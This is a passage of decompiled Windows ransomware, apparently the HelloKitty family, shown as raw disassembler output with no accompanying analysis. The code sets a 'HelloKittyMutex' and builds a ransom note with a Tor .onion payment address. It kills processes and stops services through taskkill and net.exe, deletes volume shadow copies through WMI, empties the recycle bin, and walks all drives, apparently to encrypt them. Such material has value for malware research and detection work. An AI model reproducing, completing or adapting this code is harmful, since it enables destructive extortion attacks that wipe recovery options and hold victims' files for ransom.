    v11 = v36;
    v12 = v32;
    v13 = v32 == 0;
    if ( v32 < 0 )
    {
      v12 = -v32;
      v13 = v32 == 0;
    }
    if ( !v13 )
    {
      v14 = 0;
      for ( i = v33[v12 - 1]; (i & 0xFF000000) == 0; v14 += 8 )
        i <<= 8;
      if ( i >= 0 )
      {
        do
        {
          ++v14;
          v16 = (i & 0x40000000) != 0;
          i *= 2;
        }
        while ( !v16 );
      }
    }
    sub_404630(v20, v22, v24, v26, (int)&v31);
    v5 -= v35;
    v17 = v11 + 1;
    v36 = v17;
    v34 = v5;
  }
  while ( v5 > 0 );
  return v17 << 8;
}
// 4056BC: variable 'v19' is possibly undefined
// 4056BC: variable 'v21' is possibly undefined
// 4056BC: variable 'v23' is possibly undefined
// 4056BC: variable 'v25' is possibly undefined
// 405757: variable 'v20' is possibly undefined
// 405757: variable 'v22' is possibly undefined
// 405757: variable 'v24' is possibly undefined
// 405757: variable 'v26' is possibly undefined

//----- (00405790) --------------------------------------------------------
void *sub_405790()
{
  return &unk_427468;
}

//----- (004057A0) --------------------------------------------------------
HRESULT sub_4057A0()
{
  HRESULT result; // eax
  HMODULE ModuleHandleA; // eax
  BOOL (__stdcall *IsWow64Process)(HANDLE, PBOOL); // ebx
  HANDLE CurrentProcess; // eax
  void (__stdcall *v4)(BSTR); // ebx
  OLECHAR *v5; // eax
  struct IUnknownVtbl *lpVtbl; // edx
  HANDLE ProcessHeap; // eax
  WCHAR *v8; // esi
  int v9; // eax
  HANDLE v10; // eax
  SIZE_T v11; // [esp-4h] [ebp-4Ch]
  LONG lVal; // [esp-4h] [ebp-4Ch]
  VARIANTARG pvarg; // [esp+10h] [ebp-38h] BYREF
  BSTR v14; // [esp+24h] [ebp-24h]
  BSTR v15; // [esp+28h] [ebp-20h]
  BSTR bstrString; // [esp+2Ch] [ebp-1Ch]
  LPVOID v17; // [esp+30h] [ebp-18h] BYREF
  int v18; // [esp+34h] [ebp-14h] BYREF
  int v19; // [esp+38h] [ebp-10h] BYREF
  LPVOID ppv; // [esp+3Ch] [ebp-Ch] BYREF
  IUnknown *pProxy; // [esp+40h] [ebp-8h] BYREF
  int v22; // [esp+44h] [ebp-4h] BYREF

  result = CoCreateInstance(&rclsid, 0, 1u, &riid, &ppv);
  if ( result >= 0 )
  {
    v18 = 0;
    ModuleHandleA = GetModuleHandleA("kernel32.dll");
    IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(ModuleHandleA, "IsWow64Process");
    if ( !IsWow64Process || (CurrentProcess = GetCurrentProcess(), IsWow64Process(CurrentProcess, &v18)) )
    {
      if ( v18 )
      {
        VariantInit(&pvarg);
        pvarg.lVal = 64;
        pvarg.vt = 3;
        (*(void (__stdcall **)(LPVOID, const wchar_t *, _DWORD, VARIANTARG *))(*(_DWORD *)ppv + 32))(
          ppv,
          L"__ProviderArchitecture",
          0,
          &pvarg);
        VariantClear(&pvarg);
      }
    }
    if ( CoCreateInstance(&stru_4124AC, 0, 0x4401u, &stru_4123DC, &v17) >= 0 && v17 )
    {
      v14 = SysAllocString(L"ROOT\\cimv2");
      if ( (*(int (__stdcall **)(LPVOID, BSTR, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, LPVOID, IUnknown **))(*(_DWORD *)v17 + 12))(
             v17,
             v14,
             0,
             0,
             0,
             0,
             0,
             ppv,
             &pProxy) >= 0
        && pProxy )
      {
        v4 = SysFreeString;
        if ( CoSetProxyBlanket(pProxy, 0xAu, 0, 0, 3u, 3u, 0, 0) >= 0 )
        {
          v19 = 0;
          bstrString = SysAllocString(L"WQL");
          v5 = SysAllocString(L"select * from Win32_ShadowCopy");
          lpVtbl = pProxy->lpVtbl;
          v15 = v5;
          if ( ((int (__stdcall *)(IUnknown *, BSTR, OLECHAR *, int, _DWORD, int *))lpVtbl[6].Release)(
                 pProxy,
                 bstrString,
                 v5,
                 48,
                 0,
                 &v19) >= 0 )
          {
            v22 = 0;
            (*(void (__stdcall **)(int, int, int, int *, int *))(*(_DWORD *)v19 + 16))(v19, -1, 1, &v18, &v22);
            if ( v22 )
            {
              do
              {
                if ( (*(int (__stdcall **)(int, const wchar_t *, _DWORD, VARIANTARG *, _DWORD, _DWORD))(*(_DWORD *)v18 + 16))(
                       v18,
                       L"id",
                       0,
                       &pvarg,
                       0,
                       0) >= 0
                  && pvarg.vt == 8 )
                {
                  v11 = 2 * lstrlenW(pvarg.bstrVal) + 52;
                  ProcessHeap = GetProcessHeap();
                  v8 = (WCHAR *)HeapAlloc(ProcessHeap, 8u, v11);
                  lVal = pvarg.lVal;
                  v9 = lstrlenW(pvarg.bstrVal);
                  wnsprintfW(v8, v9 + 26, L"Win32_ShadowCopy.ID='%s'", lVal);
                  if ( v8 )
                  {
                    ((void (__stdcall *)(IUnknown *, WCHAR *, _DWORD, LPVOID, _DWORD))pProxy->lpVtbl[5].AddRef)(
                      pProxy,
                      v8,
                      0,
                      ppv,
                      0);
                    v10 = GetProcessHeap();
                    HeapFree(v10, 0, v8);
                  }
                  VariantClear(&pvarg);
                }
                (*(void (__stdcall **)(int))(*(_DWORD *)v18 + 8))(v18);
                VariantClear(&pvarg);
                v22 = 0;
                (*(void (__stdcall **)(int, int, int, int *, int *))(*(_DWORD *)v19 + 16))(v19, -1, 1, &v18, &v22);
              }
              while ( v22 );
              v4 = SysFreeString;
            }
          }
          v4(bstrString);
          v4(v15);
        }
        v4(v14);
        pProxy->lpVtbl->Release(pProxy);
      }
      (*(void (__stdcall **)(LPVOID))(*(_DWORD *)v17 + 8))(v17);
    }
    return (*(int (__stdcall **)(LPVOID))(*(_DWORD *)ppv + 8))(ppv);
  }
  return result;
}
// 422E84: using guessed type wchar_t aProviderarchit[23];
// 422F14: using guessed type wchar_t aId[3];

//----- (00405A30) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  HANDLE v4; // eax
  int v5; // ecx
  unsigned int v6; // esi
  int v7; // esi
  int v8; // eax
  WCHAR *v9; // esi
  int v10; // eax
  void *v11; // eax
  const WCHAR *CommandLineW; // eax
  int result; // eax
  WCHAR *v14; // esi
  unsigned int i; // esi
  unsigned int j; // esi
  HANDLE Toolhelp32Snapshot; // esi
  int v18; // esi
  int v19; // esi
  WCHAR *v20; // esi
  HANDLE ProcessHeap; // eax
  WCHAR *v22; // eax
  WCHAR *v23; // edi
  HANDLE v24; // eax
  int pNumArgs; // [esp+14h] [ebp-107ECh] BYREF
  HLOCAL hMem; // [esp+18h] [ebp-107E8h]
  HANDLE hSnapshot; // [esp+1Ch] [ebp-107E4h]
  __int128 v28; // [esp+20h] [ebp-107E0h] BYREF
  __int64 v29; // [esp+30h] [ebp-107D0h]
  _DWORD v30[16]; // [esp+40h] [ebp-107C0h] BYREF
  int v31; // [esp+80h] [ebp-10780h]
  __int64 v32; // [esp+88h] [ebp-10778h]
  int v33; // [esp+90h] [ebp-10770h]
  int v34; // [esp+94h] [ebp-1076Ch]
  int v35; // [esp+98h] [ebp-10768h]
  int v36; // [esp+9Ch] [ebp-10764h]
  int v37; // [esp+A0h] [ebp-10760h]
  int v38; // [esp+A4h] [ebp-1075Ch]
  int v39; // [esp+A8h] [ebp-10758h]
  int v40; // [esp+ACh] [ebp-10754h]
  CHAR pszDest[32]; // [esp+B0h] [ebp-10750h] BYREF
  CHAR String1[256]; // [esp+D0h] [ebp-10730h] BYREF
  PROCESSENTRY32W pe; // [esp+1D0h] [ebp-10630h] BYREF
  WCHAR Parameters[512]; // [esp+400h] [ebp-10400h] BYREF
  WCHAR Buffer[32768]; // [esp+800h] [ebp-10000h] BYREF

  SetErrorMode(1u);
  if ( !dword_42741C )
  {
    v4 = OpenMutexW(0x100000u, 0, L"HelloKittyMutex");
    dword_42741C = (int)v4;
    if ( v4 )
    {
      CloseHandle(v4);
      goto LABEL_6;
    }
    dword_42741C = (int)CreateMutexW(0, 0, L"HelloKittyMutex");
    if ( !dword_42741C && GetLastError() != 183 )
LABEL_6:
      ExitProcess(0);
  }
  v5 = 0;
  v33 = 1779033703;
  v31 = 0;
  v32 = 0i64;
  v6 = 0;
  v34 = -1150833019;
  v35 = 1013904242;
  v36 = -1521486534;
  v37 = 1359893119;
  v38 = -1694144372;
  v39 = 528734635;
  v40 = 1541459225;
  do
  {
    *((_BYTE *)v30 + v5) = byte_4267E8[v6];
    v5 = v31 + 1;
    v31 = v5;
    if ( v5 == 64 )
    {
      sub_401410((int)v30, (int)v30);
      v32 += 512i64;
      v5 = 0;
      v31 = 0;
    }
    ++v6;
  }
  while ( v6 < 0x100 );
  sub_4015C0(v30, &v28);
  v7 = 0;
  String1[0] = 0;
  do
  {
    wnsprintfA(pszDest, 32, "%02x", *((unsigned __int8 *)&v28 + v7));
    lstrcatA(String1, pszDest);
    ++v7;
  }
  while ( v7 != 32 );
  v8 = lstrlenW(
         L"Hello dear user.\r\n"
          "Your files have been encrypted.\r\n"
          "\r\n"
          "-- What does it mean?!\r\n"
          "Content of your files have been modified. Without special key you can't undo that operation.\r\n"
          "\r\n"
          "-- How to get special key?\r\n"
          "If you want to get it, you must pay us some money and we will help you.\r\n"
          "We will give you special decryption program and instructions.\r\n"
          "\r\n"
          "-- Ok, how i can pay you?\r\n"
          "1) Download TOR browser, if you don't know how to do it you can google it.\r\n"
          "2) Open this website in tor browser: %s/%S\r\n"
          "3) Follow instructions in chat. \r\n");
  v9 = (WCHAR *)unknown_libname_2((unsigned __int64)(unsigned int)(2 * v8) >> 31 != 0 ? -1 : 4 * v8);
  if ( v9 )
  {
    wsprintfW(
      v9,
      L"Hello dear user.\r\n"
       "Your files have been encrypted.\r\n"
       "\r\n"
       "-- What does it mean?!\r\n"
       "Content of your files have been modified. Without special key you can't undo that operation.\r\n"
       "\r\n"
       "-- How to get special key?\r\n"
       "If you want to get it, you must pay us some money and we will help you.\r\n"
       "We will give you special decryption program and instructions.\r\n"
       "\r\n"
       "-- Ok, how i can pay you?\r\n"
       "1) Download TOR browser, if you don't know how to do it you can google it.\r\n"
       "2) Open this website in tor browser: %s/%S\r\n"
       "3) Follow instructions in chat. \r\n",
      L"http://6x7dp6h3w6q3ugjv4yv5gycj3femb24kysgry5b44hhgfwc5ml5qrdad.onion",
      String1);
    v10 = lstrlenW(v9);
    v29 = 0x700000000i64;
    LOWORD(v28) = 0;
    sub_405F50((void **)&v28, v9, v10);
    if ( HIDWORD(qword_4268F8) >= 8 )
    {
      v11 = (void *)lpBuffer;
      if ( (unsigned int)(2 * HIDWORD(qword_4268F8) + 2) >= 0x1000 )
      {
        if ( (unsigned int)lpBuffer - *((_DWORD *)lpBuffer - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v11 = (void *)*((_DWORD *)lpBuffer - 1);
      }
      sub_4060CB(v11);
    }
    *(_OWORD *)&lpBuffer = v28;
    qword_4268F8 = v29;
    j_j_j___free_base(v9);
  }
  pNumArgs = 0;
  CommandLineW = GetCommandLineW();
  result = (int)CommandLineToArgvW(CommandLineW, &pNumArgs);
  hMem = (HLOCAL)result;
  if ( result )
  {
    if ( pNumArgs >= 3 && !lstrcmpiW(*(LPCWSTR *)(result + 4), L"-path") )
    {
      v14 = (WCHAR *)malloc(0xFFFEu);
      if ( v14 )
      {
        lstrcpyW(v14, *((LPCWSTR *)hMem + 2));
        PathRemoveBackslashW(v14);
        sub_404B60(v14);
      }
    }
    if ( pNumArgs == 1 )
    {
      for ( i = 0; i < 20; ++i )
      {
        wsprintfW(Parameters, L"/f /im %s", off_418F98[i]);
        ShellExecuteW(0, L"open", L"taskkill.exe", Parameters, 0, 1);
      }
      for ( j = 0; j < 57; ++j )
      {
        wsprintfW(Parameters, L"stop %s", off_418FE8[j]);
        ShellExecuteW(0, L"open", L"net.exe", Parameters, 0, 1);
      }
      Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
      hSnapshot = Toolhelp32Snapshot;
      if ( Toolhelp32Snapshot != (HANDLE)-1 )
      {
        memset(&pe, 0, sizeof(pe));
        pe.dwSize = 556;
        if ( Process32FirstW(Toolhelp32Snapshot, &pe) )
        {
          do
          {
            v18 = 0;
            while ( !StrStrIW(off_417538[v18], pe.szExeFile) || pe.th32ProcessID <= 0x3E8 )
            {
              if ( (unsigned int)++v18 >= 1686 )
                goto LABEL_39;
            }
            wsprintfW(Parameters, L"/f /PID \"%d\"", pe.th32ProcessID);
            v19 = 3;
            do
            {
              ShellExecuteW(0, L"open", L"taskkill.exe", Parameters, 0, 1);
              --v19;
            }
            while ( v19 );
LABEL_39:
            Toolhelp32Snapshot = hSnapshot;
          }
          while ( Process32NextW(hSnapshot, &pe) );
        }
        CloseHandle(Toolhelp32Snapshot);
      }
      sub_4057A0();
      SHEmptyRecycleBinA(0, 0, 1u);
      sub_404D30(0);
      v20 = Buffer;
      if ( GetLogicalDriveStringsW(0x7FFFu, Buffer) && Buffer[0] )
      {
        do
        {
          ProcessHeap = GetProcessHeap();
          v22 = (WCHAR *)HeapAlloc(ProcessHeap, 8u, 0xFFFEu);
          v23 = v22;
          if ( v22 )
          {
            wnsprintfW(v22, 0x7FFF, L"\\\\?\\%c:", *v20);
            GetDriveTypeW(v23);
            sub_404B60(v23);
            v24 = GetProcessHeap();
            HeapFree(v24, 0, v23);
          }
          v20 += lstrlenW(v20) + 1;
        }
        while ( *v20 );
      }
    }
    sub_401D00();
    sub_404E00();
    LocalFree(hMem);
    ExitProcess(0);
  }
  return result;
}
// 4065E3: using guessed type int __cdecl unknown_libname_2(_DWORD);
// 417538: using guessed type wchar_t *off_417538[1687];
// 418F98: using guessed type wchar_t *off_418F98[77];
// 418FE8: using guessed type wchar_t *off_418FE8[57];
// 423BA0: using guessed type wchar_t aHttp6x7dp6h3w6[70];
// 4268F8: using guessed type __int64 qword_4268F8;
// 42741C: using guessed type int dword_42741C;

//----- (00405F50) --------------------------------------------------------
void **__thiscall sub_405F50(void **this, void *Src, unsigned int a3)
{
  unsigned int v4; // ecx
  void *v5; // ebx
  unsigned int v7; // esi
  unsigned int v8; // edx
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // ebx
  void *v13; // eax
  unsigned int v14; // [esp+Ch] [ebp-4h]

  v4 = (unsigned int)this[5];
  v14 = v4;
  if ( a3 > v4 )
  {
    if ( a3 > 0x7FFFFFFE )
      sub_406090();
    v7 = a3 | 7;
    if ( (a3 | 7) <= 0x7FFFFFFE )
    {
      v8 = v4 >> 1;
      if ( v4 <= 2147483646 - (v4 >> 1) )
      {
        if ( v7 < v8 + v4 )
          v7 = v8 + v4;
      }
      else
      {
        v7 = 2147483646;
      }
    }
    else
    {
      v7 = 2147483646;
    }
    v9 = 2 * (v7 + 1);
    if ( v7 + 1 <= 0x7FFFFFFF )
    {
      if ( v9 < 0x1000 )
      {
        if ( v9 )
          v12 = operator new(2 * (v7 + 1));
        else
          v12 = 0;
        goto LABEL_22;
      }
    }
    else
    {
      v9 = -1;
    }
    v10 = v9 + 35;
    if ( v9 + 35 <= v9 )
      v10 = -1;
    v11 = operator new(v10);
    if ( !v11 )
      goto LABEL_28;
    v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
    *(v12 - 1) = v11;
LABEL_22:
    this[5] = (void *)v7;
    this[4] = (void *)a3;
    memmove_0(v12, Src, 2 * a3);
    *((_WORD *)v12 + a3) = 0;
    if ( v14 < 8 )
    {
LABEL_27:
      *this = v12;
      return this;
    }
    v13 = *this;
    if ( 2 * v14 + 2 < 0x1000 )
    {
LABEL_26:
      sub_4060CB(v13);
      goto LABEL_27;
    }
    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )
    {
      v13 = (void *)*((_DWORD *)v13 - 1);
      goto LABEL_26;
    }
LABEL_28:
    _invalid_parameter_noinfo_noreturn();
  }
  v5 = this;
  if ( v4 >= 8 )
    v5 = *this;
  this[4] = (void *)a3;
  memmove(v5, Src, 2 * a3);
  *((_WORD *)v5 + a3) = 0;
  return this;
}
// 406090: using guessed type void __noreturn sub_406090(void);

//----- (00406090) --------------------------------------------------------
void __noreturn sub_406090()
{
  sub_407082("string too long");
}
// 406090: using guessed type void __noreturn sub_406090();

//----- (004060CB) --------------------------------------------------------
void __cdecl sub_4060CB(void *Block)
{
  j_j___free_base(Block);
}

//----- (00406690) --------------------------------------------------------
int sub_406690()
{
  __scrt_initialize_default_local_stdio_options();
  return 0;
}
// 406E21: using guessed type int __scrt_initialize_default_local_stdio_options(void);

//----- (00406698) --------------------------------------------------------
int sub_406698()
{
  int v0; // eax

  sub_406AD7();
  v0 = UserMathErrorFunction();
  return _set_new_mode(v0);
}

//----- (00406826) --------------------------------------------------------
std::exception *__thiscall sub_406826(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_alloc::`vftable';
  return this;
}
// 412328: using guessed type void *std::bad_alloc::`vftable';

//----- (00406841) --------------------------------------------------------
_DWORD *__thiscall sub_406841(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad allocation";
  *this = &std::bad_alloc::`vftable';
  return result;
}
// 412328: using guessed type void *std::bad_alloc::`vftable';

//----- (00406859) --------------------------------------------------------
std::exception *__thiscall sub_406859(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_array_new_length::`vftable';
  return this;
}
// 412344: using guessed type void *std::bad_array_new_length::`vftable';

//----- (00406874) --------------------------------------------------------
_DWORD *__thiscall sub_406874(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad array new length";
  *this = &std::bad_array_new_length::`vftable';
  return result;
}
// 412344: using guessed type void *std::bad_array_new_length::`vftable';

//----- (004068F6) --------------------------------------------------------
void __noreturn sub_4068F6()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_406841(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
}
// 4068F6: using guessed type void __noreturn sub_4068F6();
// 4068F6: using guessed type _DWORD pExceptionObject[3];

//----- (00406913) --------------------------------------------------------
void __noreturn sub_406913()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_406874(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVbad_array_new_length_std__);
}
// 406913: using guessed type void __noreturn sub_406913();
// 406913: using guessed type _DWORD pExceptionObject[3];

//----- (00406A91) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (00406AD7) --------------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_406AD7()
{
  return SetUnhandledExceptionFilter(__scrt_unhandled_exception_filter);
}

//----- (00406B24) --------------------------------------------------------
void sub_406B24()
{
  dword_426A48 = 0;
}
// 426A48: using guessed type int dword_426A48;

//----- (00406CD7) --------------------------------------------------------
int sub_406CD7()
{
  return 1;
}

//----- (00406DEB) --------------------------------------------------------
void sub_406DEB()
{
  InitializeSListHead(&ListHead);
}

//----- (00406DF7) --------------------------------------------------------
char sub_406DF7()
{
  return 1;
}

//----- (00406E1B) --------------------------------------------------------
void *sub_406E1B()
{
  return &unk_426A60;
}

//----- (00406E3E) --------------------------------------------------------
BOOL sub_406E3E()
{
  return dword_426020 == 0;
}
// 426020: using guessed type int dword_426020;

//----- (00406E4A) --------------------------------------------------------
void *sub_406E4A()
{
  return &unk_427474;
}

//----- (00406E50) --------------------------------------------------------
void *sub_406E50()
{
  return &unk_427470;
}

//----- (00406E56) --------------------------------------------------------
void sub_406E56()
{
  ;
}
// 406E56: could not find valid save-restore pair for edi

//----- (00406E82) --------------------------------------------------------
void __cdecl sub_406E82()
{
  ;
}
// 406E82: could not find valid save-restore pair for edi

//----- (00406EAE) --------------------------------------------------------
_DWORD *__thiscall sub_406EAE(_DWORD *Block, char a2)
{
  *Block = &type_info::`vftable';
  if ( (a2 & 1) != 0 )
    sub_4060CB(Block);
  return Block;
}
// 412368: using guessed type void *type_info::`vftable';

//----- (0040702B) --------------------------------------------------------
std::exception *__thiscall sub_40702B(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 412384: using guessed type void *std::length_error::`vftable';

//----- (00407046) --------------------------------------------------------
std::exception *__thiscall sub_407046(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 412384: using guessed type void *std::length_error::`vftable';

//----- (00407067) --------------------------------------------------------
std::exception *__thiscall sub_407067(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::logic_error::`vftable';
  return this;
}
// 412378: using guessed type void *std::logic_error::`vftable';

//----- (00407082) --------------------------------------------------------
void __cdecl __noreturn sub_407082(char *a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_407046((std::exception *)pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVlength_error_std__);
}

//----- (00407A3C) --------------------------------------------------------
std::exception *__thiscall sub_407A3C(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_exception::`vftable';
  return this;
}
// 412590: using guessed type void *std::bad_exception::`vftable';

//----- (00407A57) --------------------------------------------------------
_DWORD *__thiscall sub_407A57(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad exception";
  *this = &std::bad_exception::`vftable';
  return result;
}
// 412590: using guessed type void *std::bad_exception::`vftable';

//----- (00409B64) --------------------------------------------------------
int __cdecl sub_409B64(int a1)
{
  return unknown_libname_7(a1);
}
// 4099F8: using guessed type _DWORD __stdcall unknown_libname_7(_DWORD);

//----- (00409C5E) --------------------------------------------------------
int __cdecl sub_409C5E(int a1)
{
  return unknown_libname_7(a1);
}
// 4099F8: using guessed type _DWORD __stdcall unknown_libname_7(_DWORD);

//----- (0040A0B5) --------------------------------------------------------
int __cdecl sub_40A0B5(int a1)
{
  int result; // eax

  result = a1;
  dword_426E38 = a1;
  return result;
}
// 426E38: using guessed type int dword_426E38;

//----- (0040A5D8) --------------------------------------------------------
void *__cdecl sub_40A5D8(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_426F54 )
    return (void *)unknown_libname_9(*a1);
  return result;
}

//----- (0040A5F3) --------------------------------------------------------
void *__cdecl sub_40A5F3(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_426F50 )
    return (void *)unknown_libname_9(*a1);
  return result;
}

//----- (0040A6EC) --------------------------------------------------------
int __cdecl sub_40A6EC(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 40A69B: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 40A6EC: using guessed type int var_8;

//----- (0040A714) --------------------------------------------------------
int __cdecl sub_40A714(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(
           &v3,
           a2,
           &v4);
}
// 40A64A: using guessed type _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD);
// 40A714: using guessed type int var_8;

//----- (0040A99D) --------------------------------------------------------
int __cdecl sub_40A99D(_onexit_t Function)
{
  return _register_onexit_function(&stru_426F58, Function);
}

//----- (0040AA31) --------------------------------------------------------
char sub_40AA31()
{
  unknown_libname_7(&off_426118);
  return 1;
}
// 4099F8: using guessed type _DWORD __stdcall unknown_libname_7(_DWORD);
// 426118: using guessed type wchar_t *off_426118;

//----- (0040AA5D) --------------------------------------------------------
char sub_40AA5D()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 40A60E: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (0040AAA2) --------------------------------------------------------
__vcrt_bool sub_40AAA2()
{
  return __vcrt_uninitialize(0);
}

//----- (0040AB46) --------------------------------------------------------
int sub_40AB46()
{
  return dword_426F70;
}
// 426F70: using guessed type int dword_426F70;

//----- (0040AB4C) --------------------------------------------------------
int __cdecl sub_40AB4C(int a1)
{
  int result; // eax

  result = a1;
  dword_426F70 = a1;
  return result;
}
// 426F70: using guessed type int dword_426F70;

//----- (0040AB74) --------------------------------------------------------
int __cdecl sub_40AB74(int a1)
{
  return unknown_libname_7(a1);
}
// 4099F8: using guessed type _DWORD __stdcall unknown_libname_7(_DWORD);

//----- (0040AD17) --------------------------------------------------------
__int32 sub_40AD17()
{
  return _InterlockedExchange(&dword_426F7C, 1);
}
// 426F7C: using guessed type int dword_426F7C;

//----- (0040ADD6) --------------------------------------------------------
int sub_40ADD6()
{
  return dword_426F80;
}
// 426F80: using guessed type int dword_426F80;

//----- (0040AE0B) --------------------------------------------------------
void *sub_40AE0B()
{
  return &unk_426F84;
}

//----- (0040BB3A) --------------------------------------------------------
int sub_40BB3A()
{
  return common_flush_all(1);
}
// 40BB43: using guessed type _DWORD __cdecl common_flush_all(_DWORD);

//----- (0040BD85) --------------------------------------------------------
int __cdecl sub_40BD85(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(
           &v3,
           a2,
           &v4);
}
// 40BC91: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD);
// 40BD85: using guessed type int var_8;

//----- (0040BDAD) --------------------------------------------------------
int __cdecl sub_40BDAD(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(
           &v3,
           a2,
           &v4);
}
// 40BC41: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD);
// 40BDAD: using guessed type int var_8;

//----- (0040BDD5) --------------------------------------------------------
int __cdecl sub_40BDD5(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(
           &v3,
           a2,
           &v4);
}
// 40BCF2: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD);
// 40BDD5: using guessed type int var_8;

//----- (0040BDFD) --------------------------------------------------------
int __cdecl sub_40BDFD(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(
           &v3,
           a2,
           &v4);
}
// 40BD3D: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD);
// 40BDFD: using guessed type int var_8;

//----- (0040C102) --------------------------------------------------------
struct __crt_locale_data *__cdecl sub_40C102(int a1, struct __crt_locale_data **a2)
{
  struct __crt_locale_data *result; // eax

  result = *a2;
